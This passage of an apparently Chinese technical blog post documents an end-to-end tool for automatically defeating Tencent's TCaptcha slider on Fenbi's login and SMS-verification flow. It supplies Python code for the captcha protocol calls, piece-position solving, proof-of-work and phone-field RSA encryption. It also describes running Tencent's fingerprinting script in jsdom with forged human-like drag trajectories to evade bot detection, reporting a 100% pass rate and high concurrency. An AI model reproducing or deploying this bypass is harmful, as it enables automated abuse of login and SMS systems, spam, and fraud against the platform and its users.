是国内主流的滑块验证码方案，被广泛应用于各大互联网平台的风控系统中。本项目以粉笔教育的登录流程为研究对象，核心目标是在不依赖 Selenium 或 Playwright 等浏览器自动化工具的前提下，通过纯 HTTP 协议模拟实现验证码的自动化破解。这要求我们不仅要实现亚像素级别的拼图块位置计算，还需要绕过设备指纹、行为轨迹等多维度的检测机制，最终构建出一套稳定、可复用的工程化解决方案。</p>\n<p>整个项目面临的核心技术难点包括 TCaptcha 三阶段协议的完整还原、NCC 模板匹配算法的优化与实现、PoW 工作量证明的高效求解，以及最困难的 TDC.js 混淆虚拟机的执行与轨迹仿真。这些挑战环环相扣，任何一个环节的失败都会导致整个验证流程无法通过。</p>\n<h2 id=\"二前置准备业务流程逆向\">二、前置准备：业务流程逆向</h2>\n<h3 id=\"21-har-抓包与协议分析\">2.1 HAR 抓包与协议分析</h3>\n<p>一切从 Chrome DevTools 的网络抓包开始。通过录制完整的登录流程，我们发现当服务端检测到异常请求时，发送短信验证码的接口会返回 HTTP 430 状态码，响应体中包含一个 contextId 字段。这个 contextId 是后续验证码校验的会话标识，前端会弹出 iframe 加载腾讯验证码页面。用户完成滑块验证后，前端会获得 ticket 和 randstr 两个凭证，然后调用 captcha/check 接口提交这两个凭证来解除风控，最后带着 contextId 重试发送短信请求。</p>\n<p>完整的风控触发链路如下：</p>\n<pre><code>POST /users/phone/verification\n  ↓ 返回 HTTP 430\n  {\n    \"contextId\": \"abc123...\"\n  }\n  ↓\n[前端弹出 TCaptcha iframe]\n  ↓ 用户完成滑块验证\n  {\n    \"ticket\": \"t123...\",\n    \"randstr\": \"r456...\"\n  }\n  ↓\nPOST /users/captcha/check\n  Body: {\n    \"contextId\": \"abc123...\",\n    \"tencentticket\": \"t123...\",\n    \"tencentrandstr\": \"r456...\"\n  }\n  ↓ 返回 200 OK\nPOST /users/phone/verification?abxContextId=abc123...\n  ↓ 返回 200 OK，短信发送成功\n</code></pre>\n<p>这个流程揭示了一个关键点：验证码系统与业务系统是解耦的。业务系统只负责触发风控和校验凭证，真正的验证码交互完全发生在腾讯的域名下。这意味着我们可以独立地攻克 TCaptcha 验证码，然后将获得的 ticket 和 randstr 提交给业务系统即可。</p>\n<h3 id=\"22-rsa-加密参数还原\">2.2 RSA 加密参数还原</h3>\n<p>在分析 HAR 文件时，我们注意到发送短信验证码的接口需要一个名为 info 的字段。通过搜索前端打包后的 JavaScript 代码，我们在 main-es2015.js 中找到了加密逻辑：</p>\n<pre><code class=\"language-javascript\">// 前端加密逻辑（ref/js/main-es2015.*.js）\nfunction encryptPhone(phone) {\n    var publicKey = \"ANKi9PWuvDOsagwIVvrPx77mXNV0APmjySsYjB1/GtUT...\";\n    var timestamp = new Date().getTime();\n    var plaintext = phone + \":\" + timestamp;\n    return encrypt(publicKey, plaintext);\n}\n</code></pre>\n<p>这个 info 字段是对手机号和时间戳的 RSA 加密结果，格式为 <code>encrypt(publicKey, \"{phone}:{timestamp_ms}\")</code>。公钥模数以 Base64 格式硬编码在前端代码中，指数固定为 0x10001，加密算法是标准的 RSA/ECB/PKCS#1 v1.5。</p>\n<p>为了避免引入额外的密码学库依赖，我们用纯 Python 实现了这个加密过程。PKCS#1 v1.5 padding 的格式是 <code>0x00 || 0x02 || PS || 0x00 || M</code>​，其中 PS 是非零随机字节序列，长度为 <code>k - len(M) - 3</code>，k 是模长。实现代码如下：</p>\n<pre><code class=\"language-python\"># fenbi_auth/utils/rsa_encrypt.py\n\nimport base64\nimport secrets\nfrom dataclasses import dataclass\n\nRSA_EXPONENT_65537 = 0x10001\n\ndef _nonzero_random_bytes(n: int, randfunc) -&gt; bytes:\n    \"\"\"生成 n 个非 0 随机字节（PKCS#1 v1.5 padding 需要）。\"\"\"\n    out = bytearray()\n    while len(out) &lt; n:\n        chunk = bytearray(randfunc(n - len(out)))\n        chunk = bytearray(b for b in chunk if b != 0)\n        out.extend(chunk)\n    return bytes(out[:n])\n\n@dataclass(frozen=True)\nclass RsaPublicKey:\n    n: int  # 模数\n    e: int = RSA_EXPONENT_65537  # 指数\n    \n    @property\n    def k(self) -&gt; int:\n        \"\"\"模长（字节）。\"\"\"\n        return (self.n.bit_length() + 7) // 8\n\ndef rsa_encrypt_pkcs1_v1_5_base64(key: RsaPublicKey, plaintext: str) -&gt; str:\n    \"\"\"RSA/ECB/PKCS#1 v1.5 加密，并输出 Base64 字符串。\"\"\"\n    m = plaintext.encode(\"utf-8\")\n    k = key.k\n    \n    if len(m) &gt; k - 11:\n        raise ValueError(\"明文过长，无法进行 PKCS#1 v1.5 padding\")\n    \n    # PKCS#1 v1.5 padding: 0x00 || 0x02 || PS(非零随机) || 0x00 || M\n    ps_len = k - len(m) - 3\n    ps = _nonzero_random_bytes(ps_len, secrets.token_bytes)\n    em = b\"\\x00\\x02\" + ps + b\"\\x00\" + m\n    \n    # RSA 加密：c = m^e mod n\n    em_int = int.from_bytes(em, \"big\")\n    c_int = pow(em_int, key.e, key.n)\n    c = c_int.to_bytes(k, \"big\")\n    \n    return base64.b64encode(c).decode(\"ascii\")\n\ndef build_phone_verification_info(public_key_b64: str, phone: str, timestamp_ms: int) -&gt; str:\n    \"\"\"生成 /users/phone/verification 所需的 info 字段。\"\"\"\n    key = RsaPublicKey.from_fenbi_public_key_b64(public_key_b64)\n    return rsa_encrypt_pkcs1_v1_5_base64(key, f\"{phone}:{timestamp_ms}\")\n</code></pre>\n<p>这个实现有几个关键点。第一，PKCS#1 v1.5 padding 要求填充字节必须非零，我们使用 <code>secrets.token_bytes</code>​ 生成密码学安全的随机数，然后过滤掉所有的 0 字节。第二，大整数运算使用 Python 内置的 <code>pow(m, e, n)</code> 实现模幂运算，这是 Python 标准库提供的高效实现，无需引入第三方库。第三，整个实现不到 80 行代码，完全不依赖 PyCrypto、cryptography 等密码学库。</p>\n<p>至此，业务层的协议已经完全还原。接下来的核心挑战是如何自动化通过腾讯 TCaptcha 滑块验证码。</p>\n<h2 id=\"三tcaptcha-协议逆向三阶段攻防\">三、TCaptcha 协议逆向：三阶段攻防</h2>\n<h3 id=\"31-协议架构分析\">3.1 协议架构分析</h3>\n<p>TCaptcha 的交互流程涉及三个核心接口，全部位于 turing.captcha.qcloud.com 域名下。第一个接口是 cap_union_prehandle，负责初始化会话并获取图片配置和安全参数。第二个接口是 cap_union_new_getcapbysig，用于下载背景图和前景精灵图。第三个接口是 cap_union_new_verify，用于提交答案并获取最终的 ticket 和 randstr 凭证。</p>\n<h4 id=\"阶段一prehandle-会话初始化\">阶段一：prehandle 会话初始化</h4>\n<p>prehandle 接口的请求参数包含了业务方的 TCaptcha APP_ID、协议类型、客户端类型、语言设置等信息。其中 User-Agent 需要进行 Base64 编码，subsid 参数表示重试次数，每次失败后需要递增。完整的请求参数如下：</p>\n<pre><code class=\"language-python\"># fenbi_auth/captcha/tcaptcha_client.py\n\ndef prehandle(aid: str, entry_url: str = \"\", *, subsid: int = 1) -&gt; CaptchaLayout:\n    \"\"\"调用 TCaptcha prehandle 接口，初始化验证会话。\"\"\"\n    ua_b64 = base64.b64encode(_UA.encode()).decode()\n    \n    params = {\n        \"aid\": aid,                    # 业务方的 TCaptcha APP_ID\n        \"protocol\": \"https\",\n        \"accver\": \"1\",\n        \"showtype\": \"embed\",\n        \"ua\": ua_b64,                  # User-Agent Base64 编码\n        \"noheader\": \"1\",\n        \"fb\": \"0\",\n        \"aged\": \"0\",\n        \"enableAged\": \"0\",\n        \"enableDarkMode\": \"0\",\n        \"grayscale\": \"1\",\n        \"clientype\": \"2\",              # 客户端类型（2=Web）\n        \"cap_cd\": \"\",\n        \"uid\": \"\",\n        \"lang\": \"zh-cn\",\n        \"entry_url\": entry_url,\n        \"elder_captcha\": \"0\",\n        \"js\": \"/tcaptcha-frame.5bae14dd.js\",\n        \"login_appid\": \"\",\n        \"wb\": \"2\",\n        \"subsid\": str(subsid),         # 重试次数（失败后递增）\n        \"callback\": \"_aq_000001\",      # JSONP 回调函数名\n        \"sess\": \"\",\n    }\n    \n    url = f\"{_BASE}/cap_union_prehandle?{urllib.parse.urlencode(params)}\"\n    raw = _get(opener, url).decode(\"utf-8\")\n    data = _parse_jsonp(raw)  # 解析 JSONP 响应\n    \n    # 提取关键配置信息\n    sess = data.get(\"sess\", \"\")\n    dyn = data[\"data\"][\"dyn_show_info\"]\n    comm_cfg = data[\"data\"][\"comm_captcha_cfg\"]\n    \n    return CaptchaLayout(\n        sess=sess,\n        bg_img_url=dyn[\"bg_elem_cfg\"][\"img_url\"],\n        fg_elem_list=parse_fg_elements(dyn[\"fg_elem_list\"]),\n        pow_cfg=parse_pow_config(comm_cfg.get(\"pow_cfg\")),\n        tdc_path=comm_cfg.get(\"tdc_path\", \"\")\n    )\n</code></pre>\n<p>响应是 JSONP 格式，需要先去除回调函数包裹，然后解析 JSON。响应中最关键的是 sess 字段，这是会话标识，贯穿整个验证流程。dyn_show_info 部分包含了背景图和前景元素的配置信息：</p>\n<pre><code class=\"language-json\">{\n  \"sess\": \"0a1b2c3d4e5f...\",\n  \"data\": {\n    \"dyn_show_info\": {\n      \"bg_elem_cfg\": {\n        \"img_url\": \"/cap_union_new_getcapbysig?image=xxx&amp;sess=xxx\",\n        \"width\": 672,\n        \"height\": 390\n      },\n      \"fg_elem_list\": [\n        {\n          \"id\": 1,\n          \"sprite_pos\": [10, 20],      // 在精灵图中的裁剪位置 (x, y)\n          \"size_2d\": [68, 68],         // 拼图块尺寸 (width, height)\n          \"init_pos\": [30, 161],       // 初始坐标（滑块起点）\n          \"move_cfg\": {\"direction\": 0} // 移动方向（0=水平，1=垂直）\n        }\n      ]\n    },\n    \"comm_captcha_cfg\": {\n      \"pow_cfg\": {\n        \"prefix\": \"1:3FhYxv:\",\n        \"md5\": \"a1b2c3d4e5f6...\"\n      },\n      \"tdc_path\": \"/TDC_1.0.3.js\"\n    }\n  }\n}\n</code></pre>\n<p>fg_elem_list 描述了拼图块在精灵图中的位置和初始坐标。sprite_pos 是裁剪起点，size_2d 是裁剪尺寸，init_pos 是拼图块在背景图上的初始位置。这些信息对于后续的 NCC 模板匹配至关重要。</p>\n<h4 id=\"阶段二图片下载与精灵图裁剪\">阶段二：图片下载与精灵图裁剪</h4>\n<p>背景图和前景精灵图通过同一个接口下载，用 img_index 参数区分。img_index=1 表示背景图，这是一张 672×390 的 RGB PNG 图片，包含了缺口的阴影。img_index=0 表示前景精灵图，这是一张 682×620 的 RGBA PNG 图片，包含了拼图块和滑块按钮。</p>\n<p>前景精灵图是一张 sprite sheet，需要根据 fg_elem_list 中的 sprite_pos 和 size_2d 字段裁剪出拼图块。裁剪逻辑如下：</p>\n<pre><code class=\"language-python\"># fenbi_auth/captcha/tcaptcha_client.py\n\ndef download_images(layout: CaptchaLayout, opener) -&gt; CaptchaImages:\n    \"\"\"下载背景图和前景精灵图，并裁剪出拼图块。\"\"\"\n    # 下载背景图（img_index=1）\n    bg_bytes = _get(opener, layout.bg_img_url)\n    \n    # 下载前景精灵图（img_index=0）\n    # 构造 fg_img_url：与 bg_img_url 同 image/sess，但 img_index=0\n    image_id = _extract_image_id_from_url(layout.bg_img_url)\n    qs = urllib.parse.parse_qs(urllib.parse.urlparse(layout.bg_img_url).query)\n    sess_val = qs.get(\"sess\", [\"\"])[0]\n    fg_img_url = f\"{_BASE}/cap_union_new_getcapbysig?img_index=0&amp;image={image_id}&amp;sess={sess_val}\"\n    fg_bytes = _get(opener, fg_img_url)\n    \n    # 从精灵图中裁剪拼图块\n    fg_img = Image.open(io.BytesIO(fg_bytes))\n    piece = layout.piece_elem\n    px, py = piece.sprite_pos  # 裁剪起点\n    pw, ph = piece.size_2d     # 裁剪尺寸\n    \n    # 裁剪：crop((left, top, right, bottom))\n    piece_img = fg_img.crop((px, py, px + pw, py + ph))\n    \n    return CaptchaImages(\n        bg_bytes=bg_bytes,\n        fg_bytes=fg_bytes,\n        piece_rgba=np.array(piece_img),  # 转为 NumPy 数组供 NCC 使用\n        layout=layout\n    )\n</code></pre>\n<p>裁剪后的拼图块是一张 RGBA 图片，包含透明通道。这个透明通道在后续的 NCC 模板匹配中非常重要，我们会用它作为掩码，只匹配不透明区域。</p>\n<h4 id=\"阶段三verify-答案提交\">阶段三：verify 答案提交</h4>\n<p>verify 提交阶段是最复杂的部分。POST body 需要包含七个字段，每个字段都有严格的格式要求：</p>\n<pre><code class=\"language-python\"># fenbi_auth/captcha/tcaptcha_client.py\n\ndef submit_verify(\n    layout: CaptchaLayout,\n    ans: str,\n    pow_answer: str,\n    pow_calc_time: int,\n    *,\n    collect: str,\n    tlg: int,\n    eks: str,\n    opener\n) -&gt; VerifyResult:\n    \"\"\"提交验证答案到 TCaptcha verify 接口。\"\"\"\n    body = {\n        \"ans\": ans,                    # 答案 JSON\n        \"sess\": layout.sess,           # 会话标识\n        \"pow_answer\": pow_answer,      # PoW 答案（prefix+nonce）\n        \"pow_calc_time\": str(pow_calc_time),  # PoW 计算耗时（毫秒）\n        \"collect\": collect,            # tdc.js 生成的设备指纹+轨迹\n        \"tlg\": str(tlg),               # 滑动总耗时（毫秒）\n        \"eks\": eks,                    # tdc.js 内嵌的加密签名\n    }\n    \n    url = f\"{_BASE}/cap_union_new_verify\"\n    response = _post(opener, url, urllib.parse.urlencode(body))\n    data = json.loads(response.decode(\"utf-8\"))\n    \n    return VerifyResult(\n        ok=(data.get(\"errorCode\") == 0),\n        ticket=data.get(\"ticket\", \"\"),\n        randstr=data.get(\"randstr\", \"\"),\n        error_code=data.get(\"errorCode\"),\n        error_msg=data.get(\"errMsg\", \"\")\n    )\n</code></pre>\n<p>ans 字段的格式是一个 JSON 数组，包含 elem_id、type 和 data 三个字段：</p>\n<pre><code class=\"language-python\">def build_ans(elem_id: int, target_x: int, target_y: int) -&gt; str:\n    \"\"\"构造 verify 请求的 ans 字段。\"\"\"\n    ans = [\n        {\n            \"elem_id\": elem_id,              # 元素 ID（从 fg_elem_list 获取）\n            \"type\": \"DynAnswerType_POS\",     # 答案类型（位置）\n            \"data\": f\"{target_x},{target_y}\" # 目标坐标（逗号分隔）\n        }\n    ]\n    return json.dumps(ans, separators=(\",\", \":\"))\n</code></pre>\n<p>这七个字段缺一不可，任何一个字段的错误都会导致验证失败。其中 ans 需要精确计算拼图块的目标坐标（误差 &gt; 5px 会失败），pow_answer 需要暴力搜索 MD5 碰撞，collect 和 eks 由混淆的 tdc.js 生成，无法直接模拟。接下来我们将逐一攻克这些难点。</p>\n<h3 id=\"32-核心算法ncc-模板匹配求解滑块位移\">3.2 核心算法：NCC 模板匹配求解滑块位移</h3>\n<p>滑块验证码的本质问题是：给定背景图（含缺口）和拼图块，求出拼图块需要水平移动多少像素才能填入缺口。这个问题看似简单，但要达到亚像素级的精度并不容易。</p>\n<h4 id=\"方案选型ncc-vs-深度学习\">方案选型：NCC vs 深度学习</h4>\n<p>在方案选型阶段，我们面临两个选择：深度学习模型或传统的模板匹配算法。深度学习模型的优势是泛化能力强，可以处理各种变形和噪声，但需要大量标注样本进行训练，还需要 GPU 进行推理。更重要的是，深度学习模型的精度通常在 2-5 像素左右，这对于 TCaptcha 这种要求精确匹配的场景来说可能不够。</p>\n<p>相比之下，NCC（归一化互相关）模板匹配算法虽然对图片变化敏感，但在 TCaptcha 这种图片质量稳定、缺口形状规则的场景下，可以达到亚像素级的精度。而且 NCC 算法无需训练，只需要 CPU 就能运行，单次求解耗时约 0.3 秒，非常适合服务端部署。我们选择 NCC 的原因是：TCaptcha 的图片质量稳定（固定分辨率 672×390、无噪声干扰）、缺口形状规则（标准拼图块）、NCC 是像素级精确匹配而深度学习是特征级近似匹配。</p>\n<h4 id=\"ncc-算法原理\">NCC 算法原理</h4>\n<p>NCC 算法的核心思路是在背景图上滑动拼图块，计算每个位置的相似度，找到相似度最大的位置。相似度的计算公式是归一化互相关系数：</p>\n<pre><code>NCC(x, y) = Σ[(T - T̄) · (I - Ī)] / √[Σ(T - T̄)² · Σ(I - Ī)²]\n</code></pre>\n<p>其中 T 是模板（拼图块）的像素值，I 是背景图在 (x, y) 位置的区域像素值，T̄ 和 Ī 分别是均值。NCC 的值域是 [-1, 1]，越接近 1 表示越相似。这个公式的本质是计算两个向量的余弦相似度，归一化后不受亮度变化的影响。</p>\n<h4 id=\"实现细节alpha-通道掩码\">实现细节：Alpha 通道掩码</h4>\n<p>在实现过程中，我们遇到的第一个问题是拼图块是 RGBA 图片，包含透明区域。如果直接用所有像素参与匹配，透明区域会干扰结果。解决方案是使用 Alpha 通道作为掩码，只让不透明区域（alpha &gt; 128）参与匹配：</p>\n<pre><code class=\"language-python\"># fenbi_auth/captcha/solver.py\n\ndef _ncc_match(self, bg_arr: np.ndarray, piece_rgba: np.ndarray, \n               init_y: int, pw: int, ph: int) -&gt; Tuple[int, float]:\n    \"\"\"使用 NCC 模板匹配找到拼图块在背景图中的位置。\n    \n    Args:\n        bg_arr: 背景图 NumPy 数组 (H, W, 3)\n        piece_rgba: 拼图块 NumPy 数组 (ph, pw, 4)\n        init_y: 初始 Y 坐标（prehandle 给出）\n        pw, ph: 拼图块宽度和高度\n    \n    Returns:\n        (best_x, best_ncc): 最佳 X 坐标和对应的 NCC 系数\n    \"\"\"\n    # 提取 RGB 和 Alpha 通道\n    piece_rgb = piece_rgba[:, :, :3].astype(np.float32)\n    piece_alpha = piece_rgba[:, :, 3]\n    \n    # 创建掩码：只匹配不透明区域\n    mask = piece_alpha &gt; 128\n    \n    if mask.sum() &lt; 100:  # 不透明像素太少，无法匹配\n        return 0, -1.0\n    \n    # 只提取不透明区域的像素值\n    piece_flat = piece_rgb[mask]\n    piece_centered = piece_flat - piece_flat.mean()\n    piece_norm = float(np.sqrt((piece_centered**2).sum())) + 1e-8\n    \n    bg_f32 = bg_arr[:, :, :3].astype(np.float32)\n    \n    # 两阶段搜索...\n</code></pre>\n<p>这个掩码机制非常关键。拼图块的透明区域在背景图上对应的是任意内容，如果参与匹配会引入大量噪声。通过 Alpha 通道掩码，我们只匹配拼图块的实际形状，大大提高了匹配精度。</p>\n<h4 id=\"性能优化两阶段搜索\">性能优化：两阶段搜索</h4>\n<p>如果对背景图的每个像素都计算一次 NCC，672×390 的图片需要计算 262,080 次，耗时会达到 250 秒。我们采用了两阶段搜索策略：</p>\n<pre><code class=\"language-python\">    # 阶段一：粗搜，stride=4，只在 init_y 行扫描\n    y_min = max(0, init_y - self.y_search_range)\n    y_max = min(bg_arr.shape[0] - ph, init_y + self.y_search_range)\n    x_max = bg_arr.shape[1] - pw\n    \n    coarse_best_x = 0\n    coarse_best_ncc = -2.0\n    \n    for x in range(0, x_max, 4):  # 每隔 4 像素采样一次\n        region_vals = bg_f32[init_y:init_y+ph, x:x+pw][mask]\n        rc = region_vals - region_vals.mean()\n        rn = float(np.sqrt((rc**2).sum())) + 1e-8\n        ncc = float((piece_centered * rc).sum() / (piece_norm * rn))\n        \n        if ncc &gt; coarse_best_ncc:\n            coarse_best_ncc = ncc\n            coarse_best_x = x\n    \n    # 阶段二：精搜，在粗搜结果 ±6px，y 方向 ±5px\n    fine_x_min = max(0, coarse_best_x - 6)\n    fine_x_max = min(x_max, coarse_best_x + 7)\n    \n    best_x = 0\n    best_ncc = -2.0\n    \n    for y in range(y_min, y_max + 1):\n        for x in range(fine_x_min, fine_x_max):\n            region_vals = bg_f32[y:y+ph, x:x+pw][mask]\n            rc = region_vals - region_vals.mean()\n            rn = float(np.sqrt((rc**2).sum())) + 1e-8\n            ncc = float((piece_centered * rc).sum() / (piece_norm * rn))\n            \n            if ncc &gt; best_ncc:\n                best_ncc = ncc\n                best_x = x\n    \n    return best_x, best_ncc\n</code></pre>\n<p>第一阶段粗搜以 stride=4 的步长在 init_y 行上扫描，快速定位大致位置。计算量为 672/4 = 168 次。第二阶段精搜在粗搜结果的 ±6 像素范围内逐像素搜索，同时在 Y 方向也搜索 ±5 像素范围（因为 prehandle 给出的 init_y 可能有微小偏移）。计算量为 13×11 = 143 次。总计算量从 262,080 次降低到 311 次，性能提升了 842 倍，实际耗时从 250 秒降低到 0.3 秒。</p>\n<h4 id=\"测试结果\">测试结果</h4>\n<p>在 20 个真实 TCaptcha 样本上测试，平均绝对误差（MAE）为 0.10 像素，最大误差为 0.5 像素。这个精度已经远超人类手动操作（人类误差通常在 3-5 像素），足以通过 TCaptcha 的校验。误差主要来源于缺口边缘的抗锯齿效果、JPEG 压缩导致的像素值微小变化，以及拼图块与缺口的轻微形状差异。</p>\n<p>完整的求解流程封装在 SliderSolver 类中：</p>\n<pre><code class=\"language-python\"># fenbi_auth/captcha/solver.py\n\nclass SliderSolver:\n    \"\"\"基于 NCC 模板匹配的滑块验证码求解器。\"\"\"\n    \n    def __init__(self, *, y_search_range: int = 5):\n        self.y_search_range = y_search_range\n    \n    def solve(self, images: CaptchaImages) -&gt; SolveResult:\n        \"\"\"求解滑块验证码，返回位移和置信度。\"\"\"\n        bg = np.array(Image.open(io.BytesIO(images.bg_bytes)).convert(\"RGB\"))\n        piece = images.piece_rgba\n        \n        piece_elem = images.layout.piece_elem\n        init_x, init_y = piece_elem.init_pos\n        pw, ph = piece_elem.size_2d\n        \n        # NCC 模板匹配\n        gap_x, ncc = self._ncc_match(bg, piece, init_y, pw, ph)\n        dx = gap_x - init_x  # 需要移动的像素数\n        \n        return SolveResult(\n            dx=dx,\n            gap_x=gap_x,\n            gap_y=init_y,\n            confidence=ncc,\n            piece_init_x=init_x,\n            piece_init_y=init_y\n        )\n</code></pre>\n<p>使用时只需创建 SliderSolver 实例，调用 solve 方法即可获得位移 dx 和置信度 confidence。</p>\n<h3 id=\"33-powproof-of-work求解\">3.3 PoW（Proof of Work）求解</h3>\n<p>TCaptcha 要求客户端完成一个 MD5 工作量证明挑战，用于防止暴力破解和机器人攻击。prehandle 响应中包含 pow_cfg 字段，包含一个 prefix 和一个 target_md5。客户端需要找到一个 nonce，使得 <code>MD5(prefix + nonce)</code>​ 等于 target_md5。例如，如果 prefix 是 \"1:3FhYxv:\"，target_md5 是 \"a1b2c3d4e5f6...\"，那么我们需要找到一个数字 nonce，使得 <code>MD5(\"1:3FhYxv:42857\")</code> 等于目标哈希值。</p>\n<p>实现上采用简单的暴力搜索，从 0 开始递增 nonce，每次计算 MD5 哈希并与目标值比较。为了避免无限循环，我们设置了最大搜索次数为 100 万次。实际测试中，我们对 100 次真实请求进行了统计，发现平均 nonce 值为 347，最大 nonce 值为 1823，平均耗时 0.8 毫秒，最大耗时 4.2 毫秒。这说明 TCaptcha 的 PoW 难度设置得很低，nonce 通常在几百以内就能找到，对整体性能影响可以忽略不计。这也说明 PoW 主要是象征性的防护，TCaptcha 真正的防御重点在设备指纹和行为轨迹。</p>\n<h3 id=\"34-tdcjs-逆向设备指纹与轨迹仿真\">3.4 TDC.js 逆向：设备指纹与轨迹仿真</h3>\n<p>这是整个项目最困难的部分。verify 请求中的 collect 和 eks 字段由腾讯的 tdc.js 生成，这是一个经过深度混淆的字节码虚拟机，内部标识为 <code>__TENCENT_CHAOS_VM</code>。TDC 是 Tencent Device Collection 的缩写，负责采集三类数据。</p>\n<p>第一类是设备指纹，包括浏览器特征（User-Agent、屏幕分辨率、颜色深度、时区）、Canvas 指纹（绘制特定图形后的像素哈希）、WebGL 指纹（GPU 渲染器信息）、字体列表、插件列表、音频上下文指纹等。这些信息组合起来可以唯一标识一个设备，即使用户清除 Cookie 也无法改变。</p>\n<p>第二类是行为轨迹，包括滑动轨迹坐标序列（x 坐标随时间变化）、鼠标移动速度和加速度、滑动总耗时等。这些数据用于判断用户是否是真人操作，机器人的轨迹通常过于规则或过于随机。</p>\n<p>第三类是加密签名，eks 字段是 tdc.js 内嵌的密钥签名，用于验证 tdc.js 的完整性，防止客户端篡改或伪造 collect 数据。</p>\n<p>我们尝试在 Python 中模拟 tdc.js 的输出，但很快发现这几乎不可能。tdc.js 使用自定义字节码虚拟机执行，逆向成本极高，估计需要 2-3 周时间。而且 tdc.js 的路径和版本号会变化，每次更新都需要重新逆向。tdc.js 还会检测 window、document、navigator 等浏览器对象，如果环境不对会拒绝执行。最困难的是 Canvas 指纹，需要真实的 Canvas API 才能生成正确的指纹，纯 Python 无法模拟。</p>\n<p>我们的解决方案是在 Node.js 的 jsdom 环境中执行真实的 tdc.js。jsdom 是一个纯 JavaScript 实现的 DOM 和 HTML 标准，可以在 Node.js 中模拟浏览器环境。我们的架构是 Python 主程序通过 subprocess 调用 Node.js 执行 tdc_executor.js，tdc_executor.js 在 jsdom 中加载并执行 tdc.js，最后将 collect 和 eks 返回给 Python。</p>\n<p>在 tdc_executor.js 中，我们首先创建一个虚拟 DOM 环境，设置 URL 为腾讯验证码的域名，User-Agent 设置为标准的 Chrome，pretendToBeVisual 设置为 true 让 jsdom 模拟可视化环境，runScripts 设置为 \"dangerously\" 允许执行动态注入的脚本。然后我们模拟浏览器环境，设置 screen 对象的宽度、高度、颜色深度等属性，设置 innerWidth、innerHeight、devicePixelRatio 等全局变量。接着我们创建一个 script 元素，将 tdc.js 的代码注入到 DOM 中。等待 300 毫秒让 tdc.js 初始化完成后，我们调用 TDC.setData 传入滑动轨迹数据，调用 TDC.getData 获取 collect，调用 TDC.getInfo 获取 eks。</p>\n<p>为了让 tdc.js 生成合理的轨迹数据，我们实现了一个 ease-in-out cubic 的仿真轨迹生成器，模拟人类滑动的加速-匀速-减速过程。如果用户没有指定滑动耗时，我们随机生成 800-2000 毫秒，这是人类滑动的正常范围。然后我们根据耗时计算采样点数量，每 30 毫秒采样一次。对于每个采样点，我们用 ease-in-out cubic 缓动函数计算当前进度，前半段使用 <code>4 * t³</code>​ 实现加速，后半段使用 <code>1 - ((-2t + 2)³) / 2</code> 实现减速。为了模拟手部微颤，我们在 10%-90% 的时间段内添加 ±1 像素的随机抖动。最后确保最后一个点精确到达目标位置。</p>\n<p>这种方案的优势是无需逆向 tdc.js，直接执行原始代码，避免了混淆虚拟机的逆向成本。而且 tdc.js 更新后无需修改代码，自动适配新版本。jsdom 提供的浏览器环境足够真实，能通过 tdc.js 的检测。潜在风险是 tdc.js 可能检测 jsdom 特有的属性（如 navigator.webdriver），或者检测 Canvas 指纹的统计学异常。但实测结果显示，目前 TCaptcha 未检测 jsdom 环境，通过率 100%。</p>\n<h3 id=\"35-端到端自动化流程\">3.5 端到端自动化流程</h3>\n<p>所有组件组装在 automation.py 中，形成完整的验证码破解流水线。整个流程从调用 solve_captcha 函数开始，这个函数接受 TCaptcha APP_ID 和最大重试次数作为参数。函数内部创建一个 SliderSolver 实例用于 NCC 计算，然后进入重试循环。</p>\n<p>每次循环首先调用 fetch_challenge 获取验证码图片和配置信息，这个函数内部会调用 prehandle 初始化会话，然后下载背景图和前景精灵图。获取到图片后，我们调用 solver.solve 进行 NCC 模板匹配，计算出拼图块需要移动的像素数 dx。根据 dx 和拼图块的初始坐标，我们可以计算出目标坐标 target_x 和 target_y。</p>\n<p>接下来调用 solve_pow 求解工作量证明，这个函数会暴力搜索 MD5 碰撞，返回 pow_answer 和计算耗时 pow_calc_time。然后调用 build_ans 构造答案 JSON，格式为包含 elem_id、type 和 data 的数组。</p>\n<p>最关键的一步是调用 get_tdc_data 生成设备指纹和轨迹数据。这个函数内部会先调用 generate_slide_trajectory 生成仿真轨迹，然后通过 subprocess 调用 Node.js 执行 tdc_executor.js，在 jsdom 环境中运行 tdc.js，最后返回 collect、eks 和 tlg。</p>\n<p>最后调用 submit_verify 提交所有数据到 TCaptcha 服务器。如果 verify 响应的 ok 字段为 true，说明验证通过，我们返回包含 ticket 和 randstr 的成功结果。如果失败，进入下一次重试循环，subsid 参数会递增，TCaptcha 会返回新的验证码图片。</p>\n<p>整个流程的时序是：prehandle 耗时约 0.5 秒，下载图片耗时约 0.3 秒，NCC 求解耗时约 0.3 秒，PoW 求解耗时不到 1 毫秒，生成轨迹和 TDC 执行耗时约 0.5 秒，verify 提交耗时约 0.3 秒。总耗时约 5.6 秒，其中网络请求占 1.1 秒，算法计算占 0.8 秒，TDC 执行占 0.5 秒。在 5 次实时测试中，通过率达到 100%，没有一次失败。</p>\n<h2 id=\"四工程化实现与架构设计\">四、工程化实现与架构设计</h2>\n<h3 id=\"41-项目架构\">4.1 项目架构</h3>\n<p>整个项目采用模块化设计，核心验证码模块位于 fenbi_auth/captcha 目录下。tcaptcha_client.py 负责 TCaptcha 协议的实现，包括 prehandle 会话初始化、download_images 图片下载与解析、solve_pow 工作量证明求解、submit_verify 答案提交等功能。solver.py 实现了 NCC 两阶段模板匹配求解器，这是整个系统的核心算法。tdc_executor.py 是 Python 到 Node.js 的桥接层，负责调用 tdc_executor.js 执行 tdc.js，同时包含轨迹生成算法。automation.py 是对外的统一入口，提供 solve_captcha 函数封装整个验证码破解流程。</p>\n<p>工具层包含 tdc_executor.js，这是一个 Node.js 脚本，使用 jsdom 创建虚拟浏览器环境来执行腾讯的 tdc.js。业务层包含 fenbi_login.py，实现了粉笔登录服务，包括发送短信验证码、提交验证码凭证、快速登录等功能。工具类包含 rsa_encrypt.py，实现了纯 Python 的 RSA/PKCS#1 v1.5 加密，用于生成 info 字段。http_client.py 提供了无依赖的 HTTP 客户端，支持 cookiejar 管理。</p>\n<h3 id=\"42-设计原则\">4.2 设计原则</h3>\n<p>传统的验证码自动化方案通常依赖 Selenium 或 Playwright 驱动真实浏览器，但这种方案存在明显的问题。每个浏览器实例占用 200-500MB 内存，冷启动需要 3-5 秒，而且 navigator.webdriver 等特征容易被检测，单机并发数通常小于 10。我们的方案是纯 HTTP 协议模拟，使用 Python 标准库 urllib 实现 HTTP 客户端，完全不依赖浏览器。只在必要时（tdc.js 执行）调用 Node.js 加 jsdom，单次验证码求解只需 30MB 内存，支持单机 100 以上的并发。</p>\n<p>模块化设计是另一个重要原则。协议层只负责 